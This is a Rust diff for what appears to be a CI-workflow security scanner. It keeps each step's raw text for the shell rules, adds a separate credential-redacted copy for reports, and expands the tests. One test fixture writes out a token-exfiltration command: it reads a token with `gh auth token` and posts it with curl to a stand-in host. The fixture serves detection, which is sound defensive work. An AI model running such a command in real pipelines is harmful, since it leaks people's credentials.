@@ -22,18 +22,34 @@ pub struct Step {
 }
 
 impl Step {
-    /// A step with any credential in it taken out.
+    /// One step, exactly as the workflow writes it.
     ///
-    /// Redacted on the way in, as a task's command is, so no later formatter
-    /// or log can put the value back. A CI step is the likeliest place in a
-    /// repository for a token to be written out, which is the reason this
-    /// cannot wait until the report is rendered.
+    /// Not redacted here, deliberately. Every shell rule reads what the step
+    /// runs, and masking a credential first destroys the text those rules
+    /// need: `TOKEN=$(gh auth token)` masked to `TOKEN=**** auth token)` no
+    /// longer says where the token came from, so the exfiltration below it
+    /// goes unreported. A hook's command is judged raw and redacted on its
+    /// way into the report, and so is this; [`Step::redacted`] is that step.
     #[must_use]
     pub fn new(job: &str, run: &str, shell: &str) -> Self {
         Self {
-            job: redacted(job),
-            run: redacted(run),
+            job: job.to_owned(),
+            run: run.to_owned(),
             shell: shell.to_owned(),
+        }
+    }
+
+    /// The same step with any credential value in it taken out.
+    ///
+    /// All three fields: a job may be named after what it deploys with, and a
+    /// custom `shell` is a command line of its own, so a token can be written
+    /// into the template every step then runs through.
+    #[must_use]
+    pub fn redacted(&self) -> Self {
+        Self {
+            job: credential::redacted(&self.job),
+            run: credential::redacted(&self.run),
+            shell: credential::redacted(&self.shell),
         }
     }
 
@@ -52,14 +68,6 @@ impl Step {
             .map(|word| word.rsplit(['/', '\\']).next().unwrap_or(word))
             .is_some_and(|name| matches!(name, "bash" | "sh"))
     }
-}
-
-/// Text a report may carry: every credential value's visible characters
-/// replaced by `*`.
-fn redacted(text: &str) -> String {
-    credential::mask(&text.chars().collect::<Vec<char>>())
-        .into_iter()
-        .collect()
 }
 
 #[cfg(test)]
@@ -92,23 +100,45 @@ mod tests {
         }
     }
 
+    /// What reaches the report carries no credential value. Every field: a
+    /// job may be named after what it deploys with, and a custom `shell` is a
+    /// command line a token can be written into.
     #[test]
     fn a_credential_in_a_step_is_never_recorded() {
         let held = Step::new(
-            "deploy",
+            &format!("deploy-{PAT}"),
             &format!("curl -H 'Authorization: Bearer {PAT}' https://h.invalid"),
-            "bash",
-        );
+            &format!("my-shell --token {PAT} {{0}}"),
+        )
+        .redacted();
 
         assert!(!format!("{held:?}").contains(PAT), "{held:?}");
         assert!(held.run.contains("curl"), "{held:?}");
+        assert!(held.job.starts_with("deploy-"), "{held:?}");
+        assert!(held.shell.starts_with("my-shell"), "{held:?}");
+    }
+
+    /// A step is judged before it is redacted, so what it holds until then is
+    /// what the workflow wrote. Masking first destroys the text the shell
+    /// rules read: `TOKEN=$(gh auth token)` masked no longer says where the
+    /// token came from, and the exfiltration below it goes unreported.
+    #[test]
+    fn a_step_holds_what_the_workflow_wrote_until_it_is_redacted() {
+        let run = "TOKEN=$(gh auth token)\ncurl -d \"$TOKEN\" https://h.invalid";
+
+        let held = Step::new("a", run, "bash");
+
+        assert_eq!(held.run, run, "judged on what was written");
+        // And the report's copy is not that text, which is the whole point of
+        // keeping the two apart.
+        assert_ne!(held.redacted().run, run);
     }
 
     /// A job's name reaches a report too, and a workflow may name a job after
     /// what it deploys with.
     #[test]
     fn a_credential_in_a_job_name_is_never_recorded() {
-        let held = Step::new(&format!("push-{PAT}"), "echo ok", "bash");
+        let held = Step::new(&format!("push-{PAT}"), "echo ok", "bash").redacted();
 
         assert!(!format!("{held:?}").contains(PAT), "{held:?}");
         assert!(held.job.starts_with("push-"), "{held:?}");
